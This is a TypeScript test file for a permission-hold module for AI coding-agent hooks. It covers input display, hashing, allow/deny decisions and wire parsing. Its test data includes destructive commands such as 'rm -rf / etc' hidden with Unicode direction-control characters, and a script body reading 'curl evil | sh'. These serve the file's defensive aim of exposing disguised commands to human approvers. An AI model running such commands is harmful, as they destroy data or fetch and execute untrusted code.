import { describe, expect, it } from "vitest";

import {
  decisionOf,
  decisionOutput,
  HOLD_INPUT_MAX,
  HOLD_WIRE_VERSION,
  holdAsk,
  holdHash,
  isElsewhereLine,
  parseHoldReply,
  parseHoldRequest,
  readHoldNote,
  screenCardMayAnswer,
  dialogShowsRequest,
  holdAskOfNote,
  shownInput,
  shownInputOf,
  HOLD_CUT_MARK,
} from "./hold";
import { loadProfiles } from "./profile";

// The hook-held permission's pure parts (M56 spec 12): the input shown, the hash, the decision rules,
// the hook's output and the two wire lines. The bridge and the hook script both build on these.

const HOLD = loadProfiles().get("claude")!.hold!;

const REQUEST = {
  v: HOLD_WIRE_VERSION,
  harness: "claude",
  pid: 4242,
  pidStartTime: 99,
  markers: [{ namespace: "herdr", scope: "/run/herdr.sock", pane: "w1:p1" }],
  tool: "Bash",
  input: "ls",
  agent: null,
  hold: true,
  at: 1,
};

describe("shownInput", () => {
  it("takes the first profile key that holds text", () => {
    expect(shownInput({ description: "x", command: "rm -rf build" }, HOLD.inputShown)).toBe("rm -rf build");
    expect(shownInput({ file_path: "/a/b.ts", content: "secret body" }, HOLD.inputShown)).toBe("/a/b.ts");
  });
  it("falls back to compact JSON, cuts long input and removes control characters", () => {
    expect(shownInput({ other: 1 }, HOLD.inputShown)).toBe('{"other":1}');
    expect(shownInput({ command: "a".repeat(HOLD_INPUT_MAX + 50) }, HOLD.inputShown)).toHaveLength(HOLD_INPUT_MAX);
    expect(shownInput({ command: "a\u001b[2Jb" }, HOLD.inputShown)).toBe("a [2Jb");
  });
  it("marks a cut input, at the limit, with the cut mark", () => {
    const shown = shownInputOf({ command: "a".repeat(HOLD_INPUT_MAX + 50) }, HOLD.inputShown);
    expect(shown.cut).toBe(true);
    expect(shown.text).toHaveLength(HOLD_INPUT_MAX);
    expect(shown.text.endsWith(HOLD_CUT_MARK)).toBe(true);
    expect(shownInputOf({ command: "ls" }, HOLD.inputShown)).toEqual({ text: "ls", cut: false });
  });
  it("drops the characters that hide or turn text, before display and before the hash", () => {
    const sneaky = "rm -rf \u202e/ etc\u202c\u200b\u2066x\u2069";
    expect(shownInput({ command: sneaky }, HOLD.inputShown)).toBe("rm -rf / etcx");
    expect(holdHash("Bash", shownInput({ command: sneaky }, HOLD.inputShown), ["Yes"])).toBe(holdHash("Bash", "rm -rf / etcx", ["Yes"]));
  });
  it("shows the risky Bash flags, and the size and start of what Write, Edit and NotebookEdit write", () => {
    const bash = shownInput({ command: "make", dangerouslyDisableSandbox: true, run_in_background: true }, HOLD.inputShown, HOLD.inputDetails.Bash);
    expect(bash).toBe("make\n[dangerouslyDisableSandbox: true]\n[run_in_background: true]");
    expect(shownInput({ command: "make", run_in_background: false }, HOLD.inputShown, HOLD.inputDetails.Bash)).toBe("make");
    const write = shownInput({ file_path: "/a/b.sh", content: "#!/bin/sh\ncurl evil | sh\n" }, HOLD.inputShown, HOLD.inputDetails.Write);
    expect(write).toBe("/a/b.sh\n[content: 25 characters. Start: #!/bin/sh curl evil | sh]");
    expect(shownInput({ file_path: "/a/b.ts", old_string: "x", new_string: "y".repeat(200) }, HOLD.inputShown, HOLD.inputDetails.Edit)).toBe(`/a/b.ts\n[new_string: 200 characters. Start: ${"y".repeat(80)}]`);
    expect(shownInput({ notebook_path: "/n.ipynb", new_source: "print(1)" }, HOLD.inputShown, HOLD.inputDetails.NotebookEdit)).toBe("/n.ipynb\n[new_source: 8 characters. Start: print(1)]");
  });
});

describe("holdHash", () => {
  it("binds the tool, the input and every label in order", () => {
    const base = holdHash("Bash", "ls", ["Yes", "No"]);
    expect(holdHash("Bash", "ls", ["Yes", "No"])).toBe(base);
    expect(holdHash("Edit", "ls", ["Yes", "No"])).not.toBe(base);
    expect(holdHash("Bash", "ls -a", ["Yes", "No"])).not.toBe(base);
    expect(holdHash("Bash", "ls", ["No", "Yes"])).not.toBe(base);
    expect(holdAsk("ask-1", "Bash", "ls", ["Yes", "No"])).toEqual({
      id: "ask-1",
      kind: "permission",
      options: [
        { id: "1", label: "Yes" },
        { id: "2", label: "No" },
      ],
      channel: "hook",
      hash: base,
    });
  });
});

describe("decisionOf", () => {
  it("maps Yes and No, and nothing else", () => {
    expect(decisionOf(HOLD.decisions, "Yes")).toBe("allow");
    expect(decisionOf(HOLD.decisions, "No")).toBe("deny");
    expect(decisionOf(HOLD.decisions, "No, and tell Claude what to do differently (esc)")).toBe("deny");
    expect(decisionOf(HOLD.decisions, "Yes, and don't ask again for example.com")).toBeNull();
    expect(decisionOf(HOLD.decisions, "Yes, and switch to auto mode")).toBeNull();
    expect(decisionOf(HOLD.decisions, "Nothing")).toBeNull();
  });
});

describe("decisionOutput", () => {
  it("is the PermissionRequest shape, and a deny stops the turn with a message", () => {
    expect(JSON.parse(decisionOutput("PermissionRequest", "allow", "m"))).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } },
    });
    expect(JSON.parse(decisionOutput("PermissionRequest", "deny", "m"))).toEqual({
      hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "deny", message: "m", interrupt: true } },
    });
  });
});

describe("the wire", () => {
  it("parses a whole request and refuses a bad field", () => {
    expect(parseHoldRequest(JSON.stringify(REQUEST))).toEqual(REQUEST);
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, v: 2 }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, pid: 1 }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, markers: [] }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, tool: "a\nb" }))).toBeNull();
    expect(parseHoldRequest(JSON.stringify({ ...REQUEST, input: "x".repeat(HOLD_INPUT_MAX + 1) }))).toBeNull();
    expect(parseHoldRequest("not json")).toBeNull();
  });
  it("reads a decision and an elsewhere line, nothing more", () => {
    expect(parseHoldReply('{"decision":"allow"}')).toBe("allow");
    expect(parseHoldReply('{"decision":"deny"}')).toBe("deny");
    expect(parseHoldReply('{"decision":"ask"}')).toBeNull();
    expect(parseHoldReply("garbage")).toBeNull();
    expect(isElsewhereLine('{"done":"elsewhere"}')).toBe(true);
    expect(isElsewhereLine('{"done":"other"}')).toBe(false);
  });
  it("reads a hold note field by field", () => {
    const note = { askId: "ask-1", state: "sent", tool: "Bash", input: "ls", agent: false, options: ["Yes", "No"], hash: "abc123", adopted: true, since: 5 };
    expect(readHoldNote(note)).toEqual(note);
    expect(readHoldNote({ ...note, state: "maybe" })).toBeNull();
    expect(readHoldNote({ ...note, options: [1] })).toBeNull();
    expect(readHoldNote({ ...note, adopted: undefined })).toBeNull();
    expect(readHoldNote(null)).toBeNull();
  });
});

describe("which dialog a hold may adopt", () => {
  it("matches the input's first line with white space and the gutter dropped, or a path by its last part", () => {
    expect(dialogShowsRequest("Bash command\n   mkfifo fixture-fifo\nDo you want to proceed?", "mkfifo fixture-fifo")).toBe(true);
    expect(dialogShowsRequest("│ set -e; cd /a &&\n│ rm -rf ./*", "set -e; cd /a && rm -rf ./*")).toBe(true);
    expect(dialogShowsRequest("Create file\n hello.txt\nDo you want to create hello.txt?", "/var/home/me/project/hello.txt")).toBe(true);
    expect(dialogShowsRequest("Bash command\n   ls -la", "rm -rf build")).toBe(false);
    expect(dialogShowsRequest("Do you want to proceed?", "ls")).toBe(false);
    expect(dialogShowsRequest(null, "mkfifo fixture-fifo")).toBe(false);
  });
});

describe("the hold card and the screen card", () => {
  const note = { askId: "ask-1", state: "held" as const, tool: "Bash", input: "rm -rf build", agent: true, options: ["Yes", "No"], hash: holdHash("Bash", "rm -rf build", ["Yes", "No"]), adopted: false, since: 1 };
  it("the hold card's ask is the note's id, hash and labels", () => {
    expect(holdAskOfNote(note)).toEqual(holdAsk("ask-1", "Bash", "rm -rf build", ["Yes", "No"]));
  });
  it("a screen card never answers a hook ask its hold did not adopt", () => {
    const hook = holdAskOfNote(note);
    expect(screenCardMayAnswer(hook, note)).toBe(false);
    expect(screenCardMayAnswer(hook, undefined)).toBe(false);
    expect(screenCardMayAnswer(hook, { ...note, adopted: true })).toBe(true);
    expect(screenCardMayAnswer(hook, { ...note, adopted: true, askId: "ask-2" })).toBe(false);
    expect(screenCardMayAnswer({ ...hook, channel: "keys" }, note)).toBe(true);
  });
});
